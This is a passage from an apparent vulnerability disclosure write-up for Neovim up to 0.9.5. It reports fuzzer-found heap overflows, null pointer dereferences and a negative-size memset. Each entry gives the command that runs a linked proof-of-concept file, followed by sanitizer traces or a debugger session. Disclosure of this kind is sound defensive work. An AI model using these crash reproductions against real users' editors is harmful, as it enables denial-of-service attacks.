    #50 0xcf632f in call_user_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1122:5
    #51 0xd019d8 in call_user_func_check /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1259:5
    #52 0xceee8e in call_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1613:17
    #53 0xcec2af in get_func_tv /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:495:11
    #54 0xb4be74 in eval_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2193:13
    #55 0xb3eef0 in eval7 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:3000:15
    #56 0xb3bee1 in eval6 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2742:7
    #57 0xb3a0d7 in eval5 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2597:7
    #58 0xb38a96 in eval4 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2467:7
    #59 0xb37f78 in eval3 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2399:7
    #60 0xae7428 in eval2 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2342:7
    #61 0xad6a5a in eval1 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2280:7
    #62 0xad4494 in eval0 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2236:9
    #63 0xad7600 in eval_to_string /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:871:7
    #64 0x172bfd3 in vim_regsub_both /root/vuln/nvims/neovim-0.9.5/src/nvim/regexp.c:1824:31
    #65 0x17320ac in vim_regsub_multi /root/vuln/nvims/neovim-0.9.5/src/nvim/regexp.c:1696:16
    #66 0xdc16b7 in do_sub /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_cmds.c:3902:20
    #67 0xdb678a in ex_substitute /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_cmds.c:4673:9
    #68 0xe17b66 in execute_cmd0 /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:1620:7
    #69 0xdf39c1 in do_one_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:2282:7
    #70 0xde38d9 in do_cmdline /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:578:20
    #71 0xcf632f in call_user_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1122:5
    #72 0xd019d8 in call_user_func_check /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1259:5
    #73 0xceee8e in call_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1613:17
    #74 0xcec2af in get_func_tv /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:495:11
    #75 0xb4be74 in eval_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2193:13
    #76 0xb3eef0 in eval7 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:3000:15
    #77 0xb3bee1 in eval6 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2742:7
    #78 0xb3a0d7 in eval5 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2597:7
    #79 0xb38a96 in eval4 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2467:7
    #80 0xb37f78 in eval3 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2399:7
    #81 0xae7428 in eval2 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2342:7
    #82 0xad6a5a in eval1 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2280:7
    #83 0xad4494 in eval0 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2236:9
    #84 0xad7600 in eval_to_string /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:871:7
    #85 0x172bfd3 in vim_regsub_both /root/vuln/nvims/neovim-0.9.5/src/nvim/regexp.c:1824:31
    #86 0x17320ac in vim_regsub_multi /root/vuln/nvims/neovim-0.9.5/src/nvim/regexp.c:1696:16
    #87 0xdc16b7 in do_sub /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_cmds.c:3902:20
    #88 0xdb678a in ex_substitute /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_cmds.c:4673:9
    #89 0xe17b66 in execute_cmd0 /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:1620:7
    #90 0xdf39c1 in do_one_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:2282:7
    #91 0xde38d9 in do_cmdline /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:578:20
    #92 0x185a967 in do_source /root/vuln/nvims/neovim-0.9.5/src/nvim/runtime.c:2167:5
    #93 0x18557c0 in cmd_source /root/vuln/nvims/neovim-0.9.5/src/nvim/runtime.c:1717:14
    #94 0x1855313 in ex_source /root/vuln/nvims/neovim-0.9.5/src/nvim/runtime.c:1725:3
    #95 0xe17b66 in execute_cmd0 /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:1620:7
    #96 0xdf39c1 in do_one_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:2282:7
    #97 0xde38d9 in do_cmdline /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:578:20
    #98 0xde8e50 in do_cmdline_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:281:10
    #99 0x54230e in exe_commands /root/vuln/nvims/neovim-0.9.5/src/nvim/main.c:1899:5
    #100 0x528cc3 in main /root/vuln/nvims/neovim-0.9.5/src/nvim/main.c:578:5
    #101 0x7fed151e6d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #102 0x7fed151e6e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #103 0x478f84 in _start (/root/vuln/nvims/neovim-0.9.5/build/bin/nvim+0x478f84)

0x6110000020bf is located 1 bytes to the left of 200-byte region [0x6110000020c0,0x611000002188)
allocated by thread T0 here:
    #0 0x4f4169 in realloc (/root/vuln/nvims/neovim-0.9.5/build/bin/nvim+0x4f4169)
    #1 0x13507e7 in xrealloc /root/vuln/nvims/neovim-0.9.5/src/nvim/memory.c:168:15
    #2 0xfb1ae1 in ga_grow /root/vuln/nvims/neovim-0.9.5/src/nvim/garray.c:101:14
    #3 0xb2dce3 in do_string_sub /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:8067:7
    #4 0xb2beb7 in modify_fname /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:7985:15
    #5 0xe2c3ea in eval_vars /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:6974:16
    #6 0xe26086 in expand_filename /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:3773:18
    #7 0xe156b6 in execute_cmd0 /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:1557:9
    #8 0xdf39c1 in do_one_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:2282:7
    #9 0xde38d9 in do_cmdline /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:578:20
    #10 0xcf632f in call_user_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1122:5
    #11 0xd019d8 in call_user_func_check /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1259:5
    #12 0xceee8e in call_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1613:17
    #13 0xcec2af in get_func_tv /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:495:11
    #14 0xb4be74 in eval_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2193:13
    #15 0xb3eef0 in eval7 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:3000:15
    #16 0xb3bee1 in eval6 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2742:7
    #17 0xb3a0d7 in eval5 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2597:7
    #18 0xb38a96 in eval4 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2467:7
    #19 0xb37f78 in eval3 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2399:7
    #20 0xae7428 in eval2 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2342:7
    #21 0xad6a5a in eval1 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2280:7
    #22 0xad4494 in eval0 /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:2236:9
    #23 0xad7600 in eval_to_string /root/vuln/nvims/neovim-0.9.5/src/nvim/eval.c:871:7
    #24 0x172bfd3 in vim_regsub_both /root/vuln/nvims/neovim-0.9.5/src/nvim/regexp.c:1824:31
    #25 0x17320ac in vim_regsub_multi /root/vuln/nvims/neovim-0.9.5/src/nvim/regexp.c:1696:16
    #26 0xdc16b7 in do_sub /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_cmds.c:3902:20
    #27 0xdb678a in ex_substitute /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_cmds.c:4673:9
    #28 0xe17b66 in execute_cmd0 /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:1620:7
    #29 0xdf39c1 in do_one_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:2282:7

SUMMARY: AddressSanitizer: heap-buffer-overflow (/root/vuln/nvims/neovim-0.9.5/build/bin/nvim+0x4df877) in strcpy
Shadow bytes around the buggy address:
  0x0c227fff83c0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x0c227fff83d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c227fff83e0: fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa
  0x0c227fff83f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c227fff8400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa
=>0x0c227fff8410: fa fa fa fa fa fa fa[fa]00 00 00 00 00 00 00 00
  0x0c227fff8420: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c227fff8430: 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c227fff8440: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c227fff8450: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c227fff8460: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==3185407==ABORTING
```

# 6. Neovim <=0.9.5 Null Pointer Dereference in `src/nvim/popupmenu.c`

## Description
Neovim versions up to and including 0.9.5 are affected by a vulnerability where a null pointer dereference occurs in the `popupmenu.c` file at line 151. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to access a member of a null pointer. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C222571](./C222571) and [C222344](./C222344).
```sh
$ ./nvims/neovim-0.9.5/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C222571 -c :qa! 
/root/vuln/nvims/neovim-0.9.5/src/nvim/popupmenu.c:151:53: runtime error: member access within null pointer of type 'ScreenGrid' (aka 'struct ScreenGrid')
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior /root/vuln/nvims/neovim-0.9.5/src/nvim/popupmenu.c:151:53 in 

# gdb debug
$ gdb ./nvims/neovim-0.9.5/build/bin/nvim -q      
pwndbg: loaded 174 pwndbg commands and 45 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $hex2ptr, $bn_sym, $bn_var, $bn_eval, $ida GDB functions (can be used with print/break)
Reading symbols from ./nvims/neovim-0.9.5/build/bin/nvim...
------- tip of the day (disable with set show-tips off) -------
If you want Pwndbg to clear screen on each command (but still save previous output in history) use set context-clear-screen on
pwndbg> set args -u NONE -i NONE -e -n -m -X -s -S ./C222571 -c :qa! 
pwndbg> r
Starting program: /root/vuln/nvims/neovim-0.9.5/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C222571 -c :qa! 
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
pum_display (array=0x5608d70e6e80, size=2, selected=1, array_changed=true, cmd_startcol=0) at /root/vuln/nvims/neovim-0.9.5/src/nvim/popupmenu.c:151
151           pum_anchor_grid = (int)curwin->w_grid.target->handle;
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
 RAX  0
 RBX  1
 RCX  9
 RDX  0x1e
 RDI  0x5608d70b12f0 ◂— 0x3e8
 RSI  0x5608d5a70680 (decor_state) ◂— 0
 R8   1
 R9   0x5608d70ea1f0 ◂— 0x5600bdc35f74
 R10  0x5608d70e7d10 ◂— 0xe50
 R11  5
 R12  0x5608d5935fb1 ◂— 'return vim._init_defaults()'
 R13  0x1b
 R14  0x5608d5a42248 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5608d54bc760 (__do_global_dtors_aux) ◂— endbr64 
 R15  0x7f447f9bf040 (_rtld_global) —▸ 0x7f447f9c02e0 —▸ 0x5608d542f000 ◂— 0x10102464c457f
 RBP  0x7ffddfd7e690 —▸ 0x7ffddfd7e6b0 —▸ 0x7ffddfd7e6e0 —▸ 0x7ffddfd7e720 —▸ 0x7ffddfd7e740 ◂— ...
 RSP  0x7ffddfd7e5a0 ◂— 0
 RIP  0x5608d5710f2a (pum_display+436) ◂— mov eax, dword ptr [rax]
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
 ► 0x5608d5710f2a <pum_display+436>    mov    eax, dword ptr [rax]                <Cannot dereference [0]>
   0x5608d5710f2c <pum_display+438>    mov    dword ptr [rip + 0x36c20e], eax
   0x5608d5710f32 <pum_display+444>    mov    rax, qword ptr [rip + 0x35cb97]     RAX, [curwin]
   0x5608d5710f39 <pum_display+451>    mov    eax, dword ptr [rax + 0x26fc]
   0x5608d5710f3f <pum_display+457>    add    dword ptr [rbp - 0xc0], eax
   0x5608d5710f45 <pum_display+463>    mov    rax, qword ptr [rip + 0x35cb84]     RAX, [curwin]
   0x5608d5710f4c <pum_display+470>    mov    eax, dword ptr [rax + 0x2700]
   0x5608d5710f52 <pum_display+476>    add    dword ptr [rbp - 0xbc], eax
   0x5608d5710f58 <pum_display+482>    mov    edi, 6                              EDI => 6
   0x5608d5710f5d <pum_display+487>    call   ui_has                      <ui_has>
 
   0x5608d5710f62 <pum_display+492>    xor    eax, 1
─────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────
In file: /root/vuln/nvims/neovim-0.9.5/src/nvim/popupmenu.c:151
   146         cursor_col = curwin->w_width_inner - curwin->w_wcol - 1;
   147       } else {
   148         cursor_col = curwin->w_wcol;
   149       }
   150 
 ► 151       pum_anchor_grid = (int)curwin->w_grid.target->handle;
   152       pum_win_row += curwin->w_grid.row_offset;
   153       cursor_col += curwin->w_grid.col_offset;
   154       if (!ui_has(kUIMultigrid) && curwin->w_grid.target != &default_grid) {
   155         pum_anchor_grid = (int)default_grid.handle;
   156         pum_win_row += curwin->w_winrow;
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffddfd7e5a0 ◂— 0
01:0008│-0e8 0x7ffddfd7e5a8 ◂— 0x560100000000
02:0010│-0e0 0x7ffddfd7e5b0 ◂— 0x200000001
03:0018│-0d8 0x7ffddfd7e5b8 —▸ 0x5608d70e6e80 —▸ 0x5608d70e6c70 ◂— 0x500fd5f74
04:0020│-0d0 0x7ffddfd7e5c0 —▸ 0x7f447f864c80 (main_arena) ◂— 0
05:0028│-0c8 0x7ffddfd7e5c8 ◂— 0xd5a42248
06:0030│-0c0 0x7ffddfd7e5d0 ◂— 0
07:0038│-0b8 0x7ffddfd7e5d8 ◂— 0x1700000000
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0   0x5608d5710f2a pum_display+436
   1   0x5608d564fedf ins_compl_show_pum+303
   2   0x5608d56566d6 show_pum+88
   3   0x5608d565665f ins_complete+464
   4   0x5608d5575017 insert_do_complete+57
   5   0x5608d5574d86 insert_handle_key+3472
   6   0x5608d5573ff0 insert_execute+1358
   7   0x5608d57a6706 state_enter+432
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

# 7. Neovim <=0.9.5 Heap Buffer Overflow in `src/nvim/testing.c`

## Description
Neovim versions up to and including 0.9.5 are affected by a vulnerability where a heap buffer overflow occurs in the `testing.c` file at line 126. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to read beyond the allocated buffer. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C220629](./C220629).
```sh
$ ./nvims/neovim-0.9.5/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C220629 -c :qa! 
=================================================================
==3187598==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x612000000dd2 at pc 0x000001bf57d3 bp 0x7ffd771dbb10 sp 0x7ffd771dbb08
READ of size 1 at 0x612000000dd2 thread T0
    #0 0x1bf57d2 in ga_concat_shorten_esc /root/vuln/nvims/neovim-0.9.5/src/nvim/testing.c:126:12
    #1 0x1bef13f in fill_assert_error /root/vuln/nvims/neovim-0.9.5/src/nvim/testing.c:235:5
    #2 0x1be9d64 in assert_equal_common /root/vuln/nvims/neovim-0.9.5/src/nvim/testing.c:260:5
    #3 0x1be98ed in f_assert_equal /root/vuln/nvims/neovim-0.9.5/src/nvim/testing.c:372:26
    #4 0xbd8635 in call_internal_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/funcs.c:242:3
    #5 0xcef2fb in call_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1622:15
    #6 0xcec2af in get_func_tv /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:495:11
    #7 0xd23fa1 in ex_call /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:3074:9
    #8 0xe17b66 in execute_cmd0 /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:1620:7
    #9 0xdf39c1 in do_one_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:2282:7
    #10 0xde38d9 in do_cmdline /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:578:20
    #11 0x185a967 in do_source /root/vuln/nvims/neovim-0.9.5/src/nvim/runtime.c:2167:5
    #12 0x18557c0 in cmd_source /root/vuln/nvims/neovim-0.9.5/src/nvim/runtime.c:1717:14
    #13 0x1855313 in ex_source /root/vuln/nvims/neovim-0.9.5/src/nvim/runtime.c:1725:3
    #14 0xe17b66 in execute_cmd0 /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:1620:7
    #15 0xdf39c1 in do_one_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:2282:7
    #16 0xde38d9 in do_cmdline /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:578:20
    #17 0xde8e50 in do_cmdline_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:281:10
    #18 0x54230e in exe_commands /root/vuln/nvims/neovim-0.9.5/src/nvim/main.c:1899:5
    #19 0x528cc3 in main /root/vuln/nvims/neovim-0.9.5/src/nvim/main.c:578:5
    #20 0x7f81b872ad8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #21 0x7f81b872ae3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #22 0x478f84 in _start (/root/vuln/nvims/neovim-0.9.5/build/bin/nvim+0x478f84)

0x612000000dd2 is located 99 bytes to the right of 303-byte region [0x612000000c40,0x612000000d6f)
allocated by thread T0 here:
    #0 0x4f4169 in realloc (/root/vuln/nvims/neovim-0.9.5/build/bin/nvim+0x4f4169)
    #1 0x13507e7 in xrealloc /root/vuln/nvims/neovim-0.9.5/src/nvim/memory.c:168:15
    #2 0xfb1ae1 in ga_grow /root/vuln/nvims/neovim-0.9.5/src/nvim/garray.c:101:14
    #3 0xfb33f2 in ga_append /root/vuln/nvims/neovim-0.9.5/src/nvim/garray.c:221:3
    #4 0xb888cc in encode_tv2string /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/encode.c:860:3
    #5 0x1bef104 in fill_assert_error /root/vuln/nvims/neovim-0.9.5/src/nvim/testing.c:234:14
    #6 0x1be9d64 in assert_equal_common /root/vuln/nvims/neovim-0.9.5/src/nvim/testing.c:260:5
    #7 0x1be98ed in f_assert_equal /root/vuln/nvims/neovim-0.9.5/src/nvim/testing.c:372:26
    #8 0xbd8635 in call_internal_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/funcs.c:242:3
    #9 0xcef2fb in call_func /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:1622:15
    #10 0xcec2af in get_func_tv /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:495:11
    #11 0xd23fa1 in ex_call /root/vuln/nvims/neovim-0.9.5/src/nvim/eval/userfunc.c:3074:9
    #12 0xe17b66 in execute_cmd0 /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:1620:7
    #13 0xdf39c1 in do_one_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:2282:7
    #14 0xde38d9 in do_cmdline /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:578:20
    #15 0x185a967 in do_source /root/vuln/nvims/neovim-0.9.5/src/nvim/runtime.c:2167:5
    #16 0x18557c0 in cmd_source /root/vuln/nvims/neovim-0.9.5/src/nvim/runtime.c:1717:14
    #17 0x1855313 in ex_source /root/vuln/nvims/neovim-0.9.5/src/nvim/runtime.c:1725:3
    #18 0xe17b66 in execute_cmd0 /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:1620:7
    #19 0xdf39c1 in do_one_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:2282:7
    #20 0xde38d9 in do_cmdline /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:578:20
    #21 0xde8e50 in do_cmdline_cmd /root/vuln/nvims/neovim-0.9.5/src/nvim/ex_docmd.c:281:10
    #22 0x54230e in exe_commands /root/vuln/nvims/neovim-0.9.5/src/nvim/main.c:1899:5
    #23 0x528cc3 in main /root/vuln/nvims/neovim-0.9.5/src/nvim/main.c:578:5
    #24 0x7f81b872ad8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-buffer-overflow /root/vuln/nvims/neovim-0.9.5/src/nvim/testing.c:126:12 in ga_concat_shorten_esc
Shadow bytes around the buggy address:
  0x0c247fff8160: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c247fff8170: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa
  0x0c247fff8180: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c247fff8190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c247fff81a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 07 fa fa
=>0x0c247fff81b0: fa fa fa fa fa fa fa fa fa fa[fa]fa fa fa fa fa
  0x0c247fff81c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff81d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff81e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff81f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff8200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==3187598==ABORTING
```

# 8. Neovim <=0.9.5 Null Pointer Passed as Argument in `src/nvim/regexp.c`

## Description
Neovim versions up to and including 0.9.5 are affected by a vulnerability where a null pointer is passed as an argument to a function that is declared to never be null. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to pass a null pointer to a function in the `regexp.c` file at line 2325. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C223153](./C223153).
```sh
$ ./nvims/neovim-0.9.5/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C223153 -c :qa! 
/root/vuln/nvims/neovim-0.9.5/src/nvim/regexp.c:2325:15: runtime error: null pointer passed as argument 1, which is declared to never be null
/usr/include/string.h:160:33: note: nonnull attribute specified here
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior /root/vuln/nvims/neovim-0.9.5/src/nvim/regexp.c:2325:15 in 
```

# 9. Neovim <=0.8.3 Null Pointer Dereference in `src/nvim/grid.c`

## Description
Neovim is a popular open-source text editor built on the principles of Vim. In versions of Neovim up to and including 0.8.3, there exists a null pointer dereference vulnerability that can lead to a program crash and potentially other security issues.

When Neovim processes specific input, the code at line 880 in `grid.c` attempts to apply a zero offset to a null pointer, resulting in a null pointer dereference.

## PoC
poc at [C2441957](./C2441957), [C223037](./C223037), [C223016](./C223016) and [C222982](./C222982).
```sh
$ ./nvims/neovim-0.8.3/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C2441957 -c :qa! 
/root/vuln/nvims/neovim-0.8.3/src/nvim/grid.c:880:24: runtime error: applying zero offset to null pointer
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior /root/vuln/nvims/neovim-0.8.3/src/nvim/grid.c:880:24 in 
```

# 10. Neovim <=0.8.3 Negative Size Parameter in `src/nvim/ops.c` 

## Description
Neovim versions up to and including 0.8.3 are affected by a vulnerability where a negative size parameter is passed to the `memset` function, leading to undefined behavior. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to call `memset` with a negative size. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C231175](./C231175).
```sh
$ ./nvims/neovim-0.8.3/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C231175 -c :qa! 
=================================================================
==3184437==ERROR: AddressSanitizer: negative-size-param: (size=-2)
    #0 0x4ed4f9 in __asan_memset (/root/vuln/nvims/neovim-0.8.3/build/bin/nvim+0x4ed4f9)
    #1 0x1528d14 in yank_copy_line /root/vuln/nvims/neovim-0.8.3/src/nvim/ops.c:2813:3
    #2 0x14c4f78 in op_yank_reg /root/vuln/nvims/neovim-0.8.3/src/nvim/ops.c:2716:7
    #3 0x14b860d in op_delete /root/vuln/nvims/neovim-0.8.3/src/nvim/ops.c:1546:7
    #4 0x14e4f06 in op_change /root/vuln/nvims/neovim-0.8.3/src/nvim/ops.c:2450:14
    #5 0x1513461 in do_pending_operator /root/vuln/nvims/neovim-0.8.3/src/nvim/ops.c:6160:13
    #6 0x148d2aa in normal_finish_command /root/vuln/nvims/neovim-0.8.3/src/nvim/normal.c:918:5
    #7 0x142002d in normal_execute /root/vuln/nvims/neovim-0.8.3/src/nvim/normal.c:1175:3
    #8 0x1418878 in normal_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/normal.c:7420:9
    #9 0xda5358 in exec_normal /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:6446:5
    #10 0xda504e in exec_normal_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:6429:3
    #11 0xdb5ffb in ex_normal /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:6361:7
    #12 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #13 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
    #14 0xd4eac1 in do_cmdline /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:584:20
    #15 0x17def16 in do_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:2036:5
    #16 0x17da36c in cmd_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:1618:14
    #17 0x17d9ec3 in ex_source /root/vuln/nvims/neovim-0.8.3/src/nvim/runtime.c:1626:3
    #18 0xd83b36 in execute_cmd0 /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:1620:7
    #19 0xd5f903 in do_one_cmd /root/vuln/nvims/neovim-0.8.3/src/nvim/ex_docmd.c:2275:7
